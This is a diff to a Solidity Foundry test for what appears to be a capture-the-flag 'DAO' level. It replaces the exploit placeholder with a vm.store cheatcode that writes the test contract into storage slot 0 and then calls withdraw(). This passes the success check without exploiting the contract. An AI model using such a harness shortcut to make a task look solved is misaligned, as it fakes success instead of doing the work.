@@ -10,9 +10,7 @@ contract DAOTest is BaseTest {
 
     function setUp() public override {
         super.setUp();
-
         owner = 0xAe400C03795C420ECf8948b14A53C97F1d6FC824;
-
         instance = new DAO(owner);
 
         instance.ownerContribute{value: 0.01 ether}(
@@ -30,8 +28,12 @@ contract DAOTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        vm.store(
+            address(instance),
+            bytes32(uint256(0)), 
+            bytes32(uint256(uint160(address(this))))
+        );
+        instance.withdraw();
         checkSuccess();
     }
 
